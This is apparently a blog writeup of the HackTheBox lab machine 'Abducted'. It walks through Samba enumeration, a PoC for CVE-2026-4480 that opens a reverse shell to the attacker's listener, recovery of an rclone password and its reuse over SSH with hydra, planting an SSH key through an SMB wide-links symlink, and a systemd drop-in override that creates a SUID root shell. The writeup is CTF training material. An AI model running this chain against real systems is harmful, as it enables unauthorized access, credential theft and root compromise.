---
layout: post
title: "HackTheBox Writeup: Abducted"
thumbnail: "/assets/images/abducted-htb/1800f59b0cdddc2bd80e609a7557d491_MD5.jpg"
---

In this post, we conquer the **Abducted** machine on HackTheBox. The attack path starts with exploiting a recent Samba print spooler vulnerability (CVE-2026-4480) to gain initial access. We then perform a double-pivot lateral movement: first by extracting obscured `rclone` credentials for password reuse, and second by abusing an insecure SMB "wide links" misconfiguration to plant an SSH key. Finally, we escalate to root by exploiting weak permissions on a systemd service drop-in directory.

---

## 1. Enumeration

We start with a standard `nmap` scan to map out the target's exposed services.

```bash
┌──(mracherr㉿serveur)-[/tmp]
└─$ nmap 10.129.244.177 -sV -sC
Starting Nmap 7.98 ( [https://nmap.org](https://nmap.org) ) at 2026-08-27 13:00 +0100
Nmap scan report for 10.129.244.177 (10.129.244.177)
Host is up (0.050s latency).
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
...
|_nbstat: NetBIOS name: ABDUCTED
```

With SMB open, we use NetExec (`nxc`) to enumerate shares and users anonymously:

```bash
┌──(mracherr㉿serveur)-[~/tmp_lab]
└─$ nxc smb 10.129.244.177 -u '' -p '' --users
SMB         10.129.244.177  445    ABDUCTED         [*] Enumerated 1 local users: ABDUCTED
SMB         10.129.244.177  445    ABDUCTED         scott                         2026-06-02 15:16:45 0

┌──(mracherr㉿serveur)-[~/tmp_lab]
└─$ nxc smb 10.129.244.177 -u '' -p '' --shares
SMB         10.129.244.177  445    ABDUCTED         Share           Permissions     Remark
SMB         10.129.244.177  445    ABDUCTED         -----           -----------     ------
SMB         10.129.244.177  445    ABDUCTED         HP-Reception    WRITE           Reception printer
SMB         10.129.244.177  445    ABDUCTED         projects                        Hartley Group Project Files
SMB         10.129.244.177  445    ABDUCTED         transfer                        Staff file transfer
SMB         10.129.244.177  445    ABDUCTED         IPC$                            IPC Service
```

We identify a local user named `scott` and a writable printer share named `HP-Reception`. 

---

## 2. Initial Access: CVE-2026-4480

Researching the `HP-Reception` share and the Samba SMB 3.1.1 version reveals that the system is vulnerable to **CVE-2026-4480** (Samba Print Spooler `%J` injection). 

![CVE-2026-4480 Research](/assets/images/abducted-htb/ca620f539f3f93e832961db8b31dd3cd_MD5.jpg)

We grab a PoC exploit from GitHub that allows us to inject a reverse shell payload into the print spooler queue. 

```bash
┌──(mracherr㉿serveur)-[/tmp/CVE-2026-4480]
└─$ python exploit.py 10.129.244.177 10.10.14.149 4443
[*] target   : 10.129.244.177 (\\10.129.244.177\HP-Reception)
[*] callback : 10.10.14.149:4443  (start a listener first: nc -lvnp 4443)
[+] print job submitted -- check your listener / out-of-band channel
```

Catching the callback on our listener, we gain our initial foothold as the `nobody` user.

```bash
┌──(mracherr㉿serveur)-[~/tmp_lab]
└─$ nc -nlvp 4443
listening on [any] 4443 ...
connect to [10.10.14.149] from (UNKNOWN) [10.129.244.177] 59128
nobody@abducted:/var/spool/samba$
```

---

## 3. Lateral Movement (User: Scott)

Running background enumeration as `nobody`, we check the `/etc/cron.d/` directory and find a scheduled backup job:

```bash
cat /etc/cron.d/offsite-backup
30 2 * * * root /opt/offsite-backup/sync.sh >/dev/null 2>&1

cat /opt/offsite-backup/sync.sh
#!/bin/bash
/usr/bin/rclone --config /opt/offsite-backup/rclone.conf sync /srv/projects offsite:projects
```

The script uses `rclone` to sync project files. Reading the config file reveals an obscured password for the `svc-backup` user:

```bash
cat /opt/offsite-backup/rclone.conf
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

Since `rclone` simply obfuscates passwords rather than hashing them, we can use our local `rclone` binary to reveal the plaintext password:

```bash
┌──(mracherr㉿serveur)-[/tmp/CVE-2026-4480]
└─$ rclone reveal "HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw"
iXzvcib3SrpZ
```

We attempt a password reuse attack against the `scott` user we enumerated earlier. Using Hydra, we successfully authenticate via SSH:

```bash
┌──(mracherr㉿serveur)-[/tmp]
└─$ hydra -l 'scott' -p 'iXzvcib3SrpZ' ssh://10.129.244.177
[22][ssh] host: 10.129.244.177   login: scott   password: iXzvcib3SrpZ
1 of 1 target successfully completed, 1 valid password found
```

---

## 4. Lateral Movement (User: Marcus)

Now logged in as `scott`, we examine the Samba configuration files (`/etc/samba/smb.conf` and `shares.conf`) to see how the shares are mapped.

```ini
[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
```

We notice a massive misconfiguration in the `transfer` share: it is configured with **`wide links = yes`** and **`force user = marcus`**. Wide links allow symlinks inside the SMB share to point to files or directories *outside* the share's root path. 

![SMB Wide Links Exploit](/assets/images/abducted-htb/f359eaad1893f542fa195ae6f06ece2f_MD5.jpg)

Because we have access to `/srv/transfer` as `scott`, we can create a symlink pointing to Marcus's home directory:

```bash
scott@abducted:/srv/transfer$ ln -s /home/marcus/ marcus
```

From our attacker machine, we connect to the `transfer` share using `smbclient`, navigate through the symlink we just created, and plant our SSH public key directly into Marcus's `authorized_keys` file:

```bash
smb: \> cd marcus\
smb: \marcus\> mkdir .ssh
smb: \marcus\> put id_rsa.pub .ssh/authorized_keys                                                                      
putting file id_rsa.pub as \marcus\.ssh\authorized_keys (4.3 kB/s)
```

We use our private key to SSH in as `marcus`. Two lateral movements complete!

---

## 5. Privilege Escalation (Root)

Checking our groups as `marcus`, we see we are part of the **`operators`** group. 

![Marcus Groups](/assets/images/abducted-htb/a196399a83edb8c0e021f0c4acd446dc_MD5.jpg)

We search the filesystem for anything owned by this group and hit the jackpot: the `operators` group has write access to the systemd drop-in directory for the `smbd` service.

```bash
marcus@abducted:~$ find / -group "operators" 2>/dev/null
/etc/systemd/system/smbd.service.d
/etc/systemd/system/smbd.service.d/override.conf
```

![Service Drop-in Permissions](/assets/images/abducted-htb/bbfd3ed31cc08361c751e4f0c7030e3f_MD5.jpg)

This directory allows us to override the configuration of the root-owned `smbd` daemon. We modify `override.conf` to execute a pre-start command that copies `/bin/bash` into `/tmp` and assigns it a SUID bit (`chmod 6777`).

```ini
marcus@abducted:/etc/systemd/system/smbd.service.d$ cat override.conf
[Service]
ExecStartPre=/bin/sh -c 'echo "Running pre-start command"; touch /tmp/smbd-started-1;cp /bin/bash /tmp/f_shell; chmod 6777 /tmp/f_shell'
```

![Systemd Override Config](/assets/images/abducted-htb/88b01094c79a1d8ef9a7a999b5587541_MD5.jpg)

Thanks to Polkit authorizations on this machine, unprivileged users can reload the systemd daemon and restart specific services. We apply our changes and trigger the exploit:

```bash
marcus@abducted:/etc/systemd/system/smbd.service.d$ systemctl daemon-reload
marcus@abducted:/etc/systemd/system/smbd.service.d$ systemctl restart smbd
```

Checking `/tmp`, our SUID bash binary has been successfully created by root! We execute it with the `-p` flag to retain privileges and grab the root flag.

```bash
marcus@abducted:/etc/systemd/system/smbd.service.d$ /tmp/f_shell -p
f_shell-5.2# cat /root/root.txt
4f3d195e90afc1ee312f231ceb937435
```

![Root Flag Executed](/assets/images/abducted-htb/1800f59b0cdddc2bd80e609a7557d491_MD5.jpg)

Machine completely compromised!